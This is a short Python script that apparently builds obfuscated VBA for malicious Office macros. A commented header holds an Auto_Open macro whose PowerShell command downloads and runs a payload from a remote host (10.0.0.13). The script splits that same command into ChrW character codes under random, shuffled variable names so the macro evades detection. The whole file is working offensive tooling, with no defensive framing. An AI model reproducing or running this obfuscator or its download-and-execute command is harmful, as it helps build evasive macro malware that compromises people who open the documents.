# Sub Auto_Open()
# Dim exec As String
# exec = "powershell.exe ""IEX ((new-object net.webclient).downloadstring('http://10.0.0.13/payload.txt '))"""
# Shell (exec)
# End Sub

import string
import random

def name_generator():
    return  ''.join(random.choice(string.ascii_uppercase + string.ascii_lowercase) for _ in range(8))

# baseInput  = input('Pleae enter your input to be obfuscated: ')
baseInput = 'powershell.exe \"IEX ((new-object net.webclient).downloadstring(\'http://10.0.0.13/payload.txt \'))\"'

dims = int(len(baseInput)/10) + 1

dimNames = []

obfuscated = ''

for _ in range(dims):
    dim = name_generator()
    dimNames.append(dim)

obfuscated += '  Dim dnammoc As String\n'
final = '\n  dnammoc = '

dimLines = []
count = 0

shoddy_flag = False

for dim_name in dimNames:
    line = '\n  ' + dim_name + ' = '
    for i in range(count, min(count+10, len(baseInput))):
        line += 'ChrW(' + str(ord(baseInput[i])) +') '
        if((i+1 != len(baseInput)) and (i != count +9)):
            line += ' & '
    count += 10
    dimLines.append(line)

    if (shoddy_flag):
        final += ' + '
    final += dim_name
    shoddy_flag = True

random.shuffle(dimNames)
for dim in dimNames:
    obfuscated += '  Dim '+dim+' As String\n'


random.shuffle(dimLines)
for line in dimLines:
    obfuscated += line

obfuscated += final
print(obfuscated)
